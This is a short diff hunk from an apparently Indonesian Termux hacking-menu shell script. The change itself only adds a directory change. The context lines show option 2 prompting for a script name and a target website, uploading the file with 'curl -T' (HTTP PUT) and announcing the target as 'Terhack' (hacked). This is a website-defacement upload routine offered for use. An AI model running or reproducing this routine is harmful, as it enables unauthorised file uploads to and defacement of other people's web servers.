@@ -54,7 +54,8 @@ case $pil in
 1) python2 5.py
 
 ;;
-2) read -p "[?] Masukan Nama Script => " sc;
+2) cd /data/data/com.termux/files/home
+read -p "[?] Masukan Nama Script => " sc;
 read -p "[?] Masukan Web Target => " T;
 curl -T /sdcard/$sc $T
 echo "[!] Terhack => " $T/$sc | lolcat
